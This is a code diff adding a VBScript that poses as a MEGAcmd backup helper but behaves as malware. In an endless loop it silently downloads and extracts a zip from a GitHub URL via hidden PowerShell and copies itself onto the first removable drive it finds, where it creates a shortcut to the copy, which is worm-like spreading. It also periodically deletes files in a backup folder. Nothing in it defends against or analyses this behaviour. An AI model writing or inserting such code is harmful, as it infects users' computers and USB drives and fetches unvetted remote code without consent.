@@ -1,0 +1,104 @@
+Option Explicit
+
+Dim objFSO, objShell, strScriptPath, strDriveLetter, backupFolder, megaFolder, megaCmdFolder, url, zipFile, lastBackupDeleteTime
+
+lastBackupDeleteTime = Now
+
+Do
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objShell = CreateObject("WScript.Shell")
+
+    megaFolder = "C:\Mega"
+    If Not objFSO.FolderExists(megaFolder) Then
+        objFSO.CreateFolder megaFolder
+    Else
+        megaCmdFolder = megaFolder & "\MEGAcmd"
+        If Not objFSO.FolderExists(megaCmdFolder) Then
+            DownloadAndExtractMEGAcmdSetup
+        Else
+            backupFolder = megaCmdFolder & "\backup"
+            If Not objFSO.FolderExists(backupFolder) Then
+                objFSO.CreateFolder backupFolder
+            Else
+                Dim colDrives, objDrive
+                Set colDrives = objFSO.Drives
+                For Each objDrive In colDrives
+                    If objDrive.DriveType = 1 Then
+                        strDriveLetter = objDrive.DriveLetter
+                        If objFSO.FolderExists(strDriveLetter & ":\") Then
+                            CopyToPendrive strDriveLetter & ":\"
+                            Exit For
+                        End If
+                    End If
+                Next
+            End If
+        End If
+    End If
+
+    zipFile = megaFolder & "\MEGAcmd (2).zip"
+    If objFSO.FileExists(zipFile) Then
+        objFSO.DeleteFile zipFile
+    End If
+
+    If DateDiff("n", lastBackupDeleteTime, Now) >= 30 Then
+        DeleteBackupContents backupFolder
+        lastBackupDeleteTime = Now
+    End If
+
+    WScript.Sleep 5000
+Loop
+
+Sub DownloadAndExtractMEGAcmdSetup
+    url = "https://github.com/snxerame/new/raw/main/MEGAcmd%20(2).zip"
+    zipFile = megaFolder & "\MEGAcmd (2).zip"
+
+    If Not objFSO.FileExists(zipFile) Then
+        objShell.Run "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFile & "')""", 0, True
+    End If
+
+    If objFSO.FileExists(zipFile) Then
+        Dim objShellApp, objZipFile, objDestFolder
+        Set objShellApp = CreateObject("Shell.Application")
+        Set objZipFile = objShellApp.NameSpace(zipFile)
+        Set objDestFolder = objShellApp.NameSpace(megaFolder)
+
+        objDestFolder.CopyHere objZipFile.Items
+
+        Do Until objDestFolder.Items.Count = objZipFile.Items.Count
+            WScript.Sleep 1000
+        Loop
+
+        objFSO.DeleteFile zipFile
+    End If
+End Sub
+
+Sub CopyToPendrive(drivePath)
+    Dim vbsFilePath
+    vbsFilePath = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\" & objFSO.GetFileName(WScript.ScriptFullName)
+
+    If Not objFSO.FileExists(drivePath & objFSO.GetFileName(vbsFilePath)) Then
+        objFSO.CopyFile vbsFilePath, drivePath
+        WScript.Sleep 2000
+        CreateShortcut drivePath & objFSO.GetFileName(vbsFilePath)
+    End If
+End Sub
+
+Sub CreateShortcut(filePath)
+    Dim objLink
+    Set objLink = objShell.CreateShortcut(filePath & ".lnk")
+    objLink.TargetPath = filePath
+    objLink.Save
+End Sub
+
+Sub DeleteBackupContents(folderPath)
+    Dim objFolder, objFile
+    If objFSO.FolderExists(folderPath) Then
+        Set objFolder = objFSO.GetFolder(folderPath)
+        For Each objFile In objFolder.Files
+            objFSO.DeleteFile objFile.Path
+        Next
+        For Each objSubfolder In objFolder.Subfolders
+            objFSO.DeleteFolder objSubfolder.Path, True
+        Next
+    End If
+End Sub
